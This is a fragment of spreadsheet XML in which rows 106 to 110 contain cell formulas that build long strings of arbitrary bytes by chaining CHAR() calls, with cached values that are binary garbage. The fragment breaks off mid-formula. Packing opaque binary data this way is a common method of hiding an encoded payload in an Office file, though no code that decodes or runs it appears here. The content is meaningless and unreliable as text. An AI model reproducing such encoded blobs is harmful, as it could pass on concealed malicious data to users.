        <f>CHAR(85)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(92)&amp;CHAR(43)&amp;CHAR(50)&amp;CHAR(197)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(201)&amp;CHAR(253)&amp;CHAR(243)&amp;CHAR(12)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(21)&amp;CHAR(67)&amp;CHAR(201)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(2)&amp;CHAR(243)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(17)&amp;CHAR(246)&amp;CHAR(90)&amp;CHAR(78)&amp;CHAR(55)&amp;CHAR(194)&amp;CHAR(208)&amp;CHAR(25)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(95)&amp;CHAR(32)&amp;CHAR(25)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(56)&amp;CHAR(245)&amp;CHAR(139)&amp;CHAR(169)&amp;CHAR(69)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(190)&amp;CHAR(24)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(204)&amp;CHAR(156)&amp;CHAR(125)&amp;CHAR(38)&amp;CHAR(25)&amp;CHAR(115)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(126)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(137)&amp;CHAR(174)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(113)&amp;CHAR(37)&amp;CHAR(45)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(12)&amp;CHAR(129)&amp;CHAR(200)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(128)&amp;CHAR(134)&amp;CHAR(41)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(85)&amp;CHAR(139)&amp;CHAR(129)&amp;CHAR(25)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(90)&amp;CHAR(253)&amp;CHAR(213)&amp;CHAR(135)&amp;CHAR(210)&amp;CHAR(30)&amp;CHAR(142)&amp;CHAR(139)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(21)&amp;CHAR(137)&amp;CHAR(123)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(142)&amp;CHAR(136)&amp;CHAR(54)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(3)&amp;CHAR(135)&amp;CHAR(64)&amp;CHAR(16)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(244)&amp;CHAR(87)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(213)&amp;CHAR(14)&amp;CHAR(138)&amp;CHAR(107)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(152)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(86)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(80)&amp;CHAR(85)&amp;CHAR(136)&amp;CHAR(13)&amp;CHAR(254)&amp;CHAR(80)&amp;CHAR(42)&amp;CHAR(134)&amp;CHAR(195)&amp;CHAR(10)&amp;CHAR(133)&amp;CHAR(89)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(120)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(89)&amp;CHAR(135)&amp;CHAR(129)&amp;CHAR(88)&amp;CHAR(6)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(86)&amp;CHAR(137)&amp;CHAR(22)&amp;CHAR(135)&amp;CHAR(132)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(91)&amp;CHAR(252)&amp;CHAR(89)&amp;CHAR(46)&amp;CHAR(53)&amp;CHAR(253)&amp;CHAR(136)&amp;CHAR(193)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(57)&amp;CHAR(4)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(77)&amp;CHAR(14)&amp;CHAR(90)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(254)&amp;CHAR(83)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(198)&amp;CHAR(2)&amp;CHAR(155)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(135)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(80)&amp;CHAR(115)&amp;CHAR(142)&amp;CHAR(91)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(243)</f>
        <v>U_x000D_R‚_x000F_ù\+2ÅÀ_x0002__x0002_‰I'_x0001_‚Éýó_x000C_ÄL_x0015_CÉ_x0005__x000D_ŽA'_x0002_óq"
ŽE_x0011_öZN7ÂÐ_x0019__x0006_ë_x001E_TŽ_ _x0019_S\T8õ‹©E_x0006__x0004_	‰¾_x0018__x0001__x0005__x000B__x0007_Ìœ}&amp;_x0019_s_x0005_†~_x0001_Ž‰®_x0002__x0002__x0005_ˆq%-‡Ê_x000C_È_x0004__x000B__x000B_W€†)_x0007__x0006__x000C_U‹_x0019__x0001__x0005_	ZýÕ‡Ò_x001E_Ž‹_x0006_
_x0007_Ž_x0015_‰{_x0002_]Žˆ6_x0002__x0002__x000D_Q_x0003_‡@_x0010_TWôW_x0006_ŽÕ_x000E_Šk_x0006__x0006__x000D_˜_x0006_ˆV._x0016_PUˆ_x000D_þP*†Ã
…Y
_x000B__x0001_Žy!_x0017__x0006_x_x001F__x000D_ˆC_x000D_Y‡X_x0006__x0012__x0011_V‰_x0016_‡„I_x0007__x0004__x0005_V[üY.5ýˆÁ_x000B_9_x0004__x0014__x0004_ŽM_x000E_Z€_x001D_þS!‚Æ_x0002_›_x0004__x0004__x0002_
‡_x0001__x0001__x0005__x0001_QýPsŽ[_x000D_€ó</v>
      </c>
      <c r="C106" t="str">
        <f>CHAR(159)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(72)&amp;CHAR(43)&amp;CHAR(180)&amp;CHAR(110)&amp;CHAR(236)&amp;CHAR(252)</f>
        <v>Ÿüô6H+´nìü</v>
      </c>
    </row>
    <row r="107" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B107" t="str">
        <f>CHAR(140)&amp;CHAR(75)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(105)&amp;CHAR(6)&amp;CHAR(135)&amp;CHAR(15)&amp;CHAR(81)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(33)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(52)&amp;CHAR(85)&amp;CHAR(153)&amp;CHAR(225)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(115)&amp;CHAR(143)&amp;CHAR(241)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(211)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(95)&amp;CHAR(46)&amp;CHAR(30)&amp;CHAR(137)&amp;CHAR(121)&amp;CHAR(37)&amp;CHAR(40)&amp;CHAR(130)&amp;CHAR(24)&amp;CHAR(136)&amp;CHAR(82)&amp;CHAR(20)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(133)&amp;CHAR(102)&amp;CHAR(15)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(84)&amp;CHAR(242)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(197)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(183)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(134)&amp;CHAR(101)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(25)&amp;CHAR(86)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(20)&amp;CHAR(246)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(143)&amp;CHAR(250)&amp;CHAR(151)&amp;CHAR(238)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(151)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(83)&amp;CHAR(9)&amp;CHAR(53)&amp;CHAR(202)&amp;CHAR(136)&amp;CHAR(195)&amp;CHAR(51)&amp;CHAR(131)&amp;CHAR(22)&amp;CHAR(20)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(61)&amp;CHAR(128)&amp;CHAR(27)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(99)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(210)&amp;CHAR(141)&amp;CHAR(130)&amp;CHAR(36)&amp;CHAR(11)&amp;CHAR(24)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(68)&amp;CHAR(56)&amp;CHAR(152)&amp;CHAR(21)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(113)&amp;CHAR(232)&amp;CHAR(122)&amp;CHAR(13)&amp;CHAR(48)&amp;CHAR(134)&amp;CHAR(17)&amp;CHAR(20)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(113)&amp;CHAR(229)&amp;CHAR(135)&amp;CHAR(89)&amp;CHAR(34)&amp;CHAR(42)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(21)&amp;CHAR(132)&amp;CHAR(76)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(85)&amp;CHAR(67)&amp;CHAR(154)&amp;CHAR(23)&amp;CHAR(253)&amp;CHAR(149)&amp;CHAR(190)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(243)&amp;CHAR(221)&amp;CHAR(29)&amp;CHAR(202)&amp;CHAR(48)&amp;CHAR(217)&amp;CHAR(74)&amp;CHAR(141)&amp;CHAR(200)&amp;CHAR(132)&amp;CHAR(69)&amp;CHAR(32)&amp;CHAR(25)&amp;CHAR(129)&amp;CHAR(66)&amp;CHAR(24)&amp;CHAR(61)&amp;CHAR(144)&amp;CHAR(31)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(103)&amp;CHAR(38)&amp;CHAR(117)&amp;CHAR(1)&amp;CHAR(62)&amp;CHAR(147)&amp;CHAR(29)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(116)&amp;CHAR(23)&amp;CHAR(138)&amp;CHAR(150)&amp;CHAR(44)&amp;CHAR(27)&amp;CHAR(28)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(23)&amp;CHAR(11)&amp;CHAR(68)&amp;CHAR(54)&amp;CHAR(144)&amp;CHAR(31)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(119)&amp;CHAR(232)&amp;CHAR(116)&amp;CHAR(14)&amp;CHAR(55)&amp;CHAR(136)&amp;CHAR(22)&amp;CHAR(27)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(234)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(102)&amp;CHAR(153)&amp;CHAR(85)&amp;CHAR(34)&amp;CHAR(18)&amp;CHAR(88)&amp;CHAR(84)&amp;CHAR(90)&amp;CHAR(94)&amp;CHAR(128)</f>
        <v>ŒK	Ui_x0006_‡_x000F_QPŒA!!õS4U™áùQsñ
‹Ó_x0005__x0006_
ˆ_._x001E_‰y%(‚_x0018_ˆR_x0014_U†…f_x000F__x0015__x0001_‰_x0003_WTò_x0002_„Å_x000D_‚·_x0002__x0005__x0003_†e%"_x0003_ˆ€_x001D__x001C__x000B__x000B_ˆI!_x0019_ŽB(_x0019_Vh_x0004_o_x0014_öYZú—î	†—
_x0007__x0005_ˆS	5ÊˆÃ3ƒ_x0016__x0014__x0001__x0004_{'r_x001C_=€_x001B__x001F_
_x000B_c"1Ò‚$_x000B__x0018__x0005__x0002_‚_x0006__x0008_D8˜_x0015__x0018__x0002__x0003_qèz_x000D_0†_x0011__x0014__x0005__x0005_qå‡Y"*ŽK_x0015_„L_x0016_TUCš_x0017_ý•¾_x0007__x0005__x0003_óÝ_x001D_Ê0ÙJÈ„E _x0019_B_x0018_=_x001F__x001F_
_x000B_g&amp;u_x0001_&gt;“_x001D_
_x0001__x0005_t_x0017_Š–,_x001B__x001C__x0001__x0001_Š_x0017__x000B_D6_x001F__x0012__x0001__x000D_wèt_x000E_7ˆ_x0016__x001B__x0005__x0005_wê]ýWf™U"_x0012_XTZ^€</v>
      </c>
      <c r="C107" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(7)</f>
        <v>ô6ŒS»ë÷ý¼_x0007_</v>
      </c>
    </row>
    <row r="108" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B108" t="str">
        <f>CHAR(192)&amp;CHAR(17)&amp;CHAR(197)&amp;CHAR(137)&amp;CHAR(36)&amp;CHAR(11)&amp;CHAR(227)&amp;CHAR(202)&amp;CHAR(252)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(141)&amp;CHAR(55)&amp;CHAR(227)&amp;CHAR(194)&amp;CHAR(234)&amp;CHAR(251)&amp;CHAR(250)&amp;CHAR(56)&amp;CHAR(249)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(145)&amp;CHAR(163)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(166)&amp;CHAR(251)&amp;CHAR(250)&amp;CHAR(252)&amp;CHAR(143)&amp;CHAR(114)&amp;CHAR(13)&amp;CHAR(53)&amp;CHAR(194)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(229)&amp;CHAR(102)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(94)&amp;CHAR(54)&amp;CHAR(101)&amp;CHAR(53)&amp;CHAR(194)&amp;CHAR(82)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(136)&amp;CHAR(127)&amp;CHAR(32)&amp;CHAR(57)&amp;CHAR(53)&amp;CHAR(231)&amp;CHAR(34)&amp;CHAR(103)&amp;CHAR(46)&amp;CHAR(18)&amp;CHAR(143)&amp;CHAR(190)&amp;CHAR(73)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(174)&amp;CHAR(191)&amp;CHAR(175)&amp;CHAR(174)&amp;CHAR(56)&amp;CHAR(198)&amp;CHAR(108)&amp;CHAR(130)&amp;CHAR(81)&amp;CHAR(37)&amp;CHAR(18)&amp;CHAR(73)&amp;CHAR(62)&amp;CHAR(133)&amp;CHAR(1)&amp;CHAR(22)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(118)&amp;CHAR(8)&amp;CHAR(137)&amp;CHAR(52)&amp;CHAR(134)&amp;CHAR(61)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(132)&amp;CHAR(102)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(129)&amp;CHAR(47)&amp;CHAR(143)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(125)&amp;CHAR(26)&amp;CHAR(85)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(246)&amp;CHAR(90)&amp;CHAR(66)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(29)&amp;CHAR(153)&amp;CHAR(71)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(80)&amp;CHAR(33)&amp;CHAR(18)&amp;CHAR(88)&amp;CHAR(83)&amp;CHAR(128)&amp;CHAR(2)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(69)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(75)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(69)&amp;CHAR(107)&amp;CHAR(3)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(236)&amp;CHAR(82)&amp;CHAR(109)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(85)&amp;CHAR(105)&amp;CHAR(4)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(31)&amp;CHAR(252)&amp;CHAR(86)&amp;CHAR(97)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(33)&amp;CHAR(38)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(39)&amp;CHAR(133)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(185)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(96)&amp;CHAR(3)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(120)&amp;CHAR(29)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(239)&amp;CHAR(54)&amp;CHAR(202)&amp;CHAR(61)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(178)&amp;CHAR(14)&amp;CHAR(34)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(98)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(56)&amp;CHAR(112)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(176)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(83)&amp;CHAR(99)&amp;CHAR(15)</f>
        <v>À_x0011_Å‰$_x000B_ãÊüòþ7ãÂêûú8ù‡M_x001D_QŠ[_x0002__x000D__x0013_QˆF_x0006__x0002__x0005_SRVþ‘£_x0003__x0005__x000D_€Ë_x0004_ˆ¦ûúür_x000D_5Âî»†åfQ^6e5ÂR\Pˆ 95ç"g._x0012_¾I_x0003_	
®¿¯®8Æl‚Q%_x0012_I&gt;…_x0001__x0016__x0001__x0005_v_x0008_‰4†=_x0007__x000E_„f_x0002__x0003__x0005_†/_x0001__x000D__x0005_ŽK_x0012_}_x001A_UTŽ_x0004_öZBÂ_x001D_™G_x0003__x0007_
Œ_x0002_ŽP!_x0012_XS€_x0002_ùSE„Ä_x0006_‚K_x0016__x0004__x0005_†B./Ek_x0003_ös"_x0011_ìRmN&amp;"Ui_x0004_þu&amp;_x001F_üVaŽO/!&amp;A!'…Ì_x0004_	†¹_x0005__x0005_	`_x0003_n_x0002_x_x001D_ùQ[ï6Ê=‹_x0002__x0002__x0003__x000B_²_x000E_"_x000D__x0001_b€N!8p]ô°_x000E__x0003__x0015__x0001_Sc_x000F_</v>
      </c>
      <c r="C108" t="str">
        <f>CHAR(31)&amp;CHAR(82)&amp;CHAR(183)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(223)</f>
        <v>_x001F_R·ë÷ý‘~Fß</v>
      </c>
    </row>
    <row r="109" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B109" t="str">
        <f>CHAR(249)&amp;CHAR(94)&amp;CHAR(79)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(38)&amp;CHAR(62)&amp;CHAR(49)&amp;CHAR(194)&amp;CHAR(140)&amp;CHAR(135)&amp;CHAR(33)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(58)&amp;CHAR(131)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(119)&amp;CHAR(110)&amp;CHAR(196)&amp;CHAR(229)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(195)&amp;CHAR(85)&amp;CHAR(246)&amp;CHAR(89)&amp;CHAR(114)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(150)&amp;CHAR(53)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(32)&amp;CHAR(57)&amp;CHAR(249)&amp;CHAR(89)&amp;CHAR(99)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(73)&amp;CHAR(131)&amp;CHAR(129)&amp;CHAR(48)&amp;CHAR(132)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(49)&amp;CHAR(141)&amp;CHAR(17)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(117)&amp;CHAR(205)&amp;CHAR(230)&amp;CHAR(63)&amp;CHAR(107)&amp;CHAR(4)&amp;CHAR(83)&amp;CHAR(96)&amp;CHAR(10)&amp;CHAR(253)&amp;CHAR(86)&amp;CHAR(95)&amp;CHAR(134)&amp;CHAR(165)&amp;CHAR(37)&amp;CHAR(130)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(53)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(86)&amp;CHAR(243)&amp;CHAR(86)&amp;CHAR(118)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(82)&amp;CHAR(237)&amp;CHAR(101)&amp;CHAR(34)&amp;CHAR(62)&amp;CHAR(248)&amp;CHAR(89)&amp;CHAR(103)&amp;CHAR(134)&amp;CHAR(167)&amp;CHAR(32)&amp;CHAR(133)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(135)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(33)&amp;CHAR(81)&amp;CHAR(137)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(129)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(83)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(117)&amp;CHAR(130)&amp;CHAR(102)&amp;CHAR(45)&amp;CHAR(67)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(71)&amp;CHAR(37)&amp;CHAR(89)&amp;CHAR(80)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(143)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(65)&amp;CHAR(103)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(134)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(136)&amp;CHAR(237)&amp;CHAR(29)&amp;CHAR(142)&amp;CHAR(249)&amp;CHAR(136)&amp;CHAR(14)&amp;CHAR(92)&amp;CHAR(160)&amp;CHAR(163)&amp;CHAR(167)&amp;CHAR(160)&amp;CHAR(250)&amp;CHAR(148)&amp;CHAR(157)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(135)&amp;CHAR(255)&amp;CHAR(30)&amp;CHAR(130)&amp;CHAR(48)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(32)&amp;CHAR(49)&amp;CHAR(249)&amp;CHAR(89)&amp;CHAR(103)&amp;CHAR(94)&amp;CHAR(245)&amp;CHAR(85)&amp;CHAR(102)&amp;CHAR(228)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(36)&amp;CHAR(59)&amp;CHAR(237)&amp;CHAR(30)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(147)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(86)&amp;CHAR(242)&amp;CHAR(64)&amp;CHAR(113)&amp;CHAR(142)&amp;CHAR(234)&amp;CHAR(131)&amp;CHAR(110)&amp;CHAR(38)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(232)&amp;CHAR(14)&amp;CHAR(133)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(131)&amp;CHAR(15)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(80)</f>
        <v>ù^OˆA&amp;&gt;1ÂŒ‡!_x0001__x0002__x0003_:ƒ	_x000D__x000B__x000B_wnÄå
_x0003__x0004__x000D__x0006__x0002__x0006_ÃUöYrT–5‚_x0002__x0007_
Wúw 9ùYc€Ž"‚_x000D__x0001__x0004_Iƒ0„_x0005__x000B__x0006_1_x0011_	_x0002_	uÍæ?k_x0004_S`
ýV_†¥%‚_x0003__x0003__x0005__x000D_ŒO/5€A!_x0013_VóVvRˆ!
_x0002__x0004_Ríe"&gt;øYg†§ …_x0006_
_x0003__x000B_‡B&amp;!Q‰._x0014__x0004__x0005_[SõXu‚f-C_x0006_€G%YP9Âq'EAg‹G'E†_x0002_^ˆí_x001D_Žùˆ_x000E_\ £§ ú”
_x0002__x0004_‡ÿ_x001E_‚0_x0006_
_x0007_úw 1ùYg^õUfä#_x0005_	
$;í_x001E_
_x0006_
†“_x0005__x0006_	_x0007_Vò@qŽêƒn&amp;_x001D_†è_x000E_…_x0004__x0002__x0003__x0005_€ƒ_x000F__x000D__x0001__x000D_UúP</v>
      </c>
      <c r="C109" t="str">
        <f>CHAR(158)&amp;CHAR(195)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(155)&amp;CHAR(219)&amp;CHAR(62)&amp;CHAR(43)</f>
        <v>žÃ÷ýôÉ›Û&gt;+</v>
      </c>
    </row>
    <row r="110" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B110" t="str">
        <f>CHAR(118)&amp;CHAR(133)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(30)&amp;CHAR(128)&amp;CHAR(197)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(227)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(153)&amp;CHAR(157)&amp;CHAR(34)&amp;CHAR(134)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(16)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(94)&amp;CHAR(88)&amp;CHAR(141)&amp;CHAR(8)&amp;CHAR(132)&amp;CHAR(69)&amp;CHAR(32)&amp;CHAR(61)&amp;CHAR(245)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(143)&amp;CHAR(253)&amp;CHAR(142)&amp;CHAR(249)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(171)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(140)&amp;CHAR(128)&am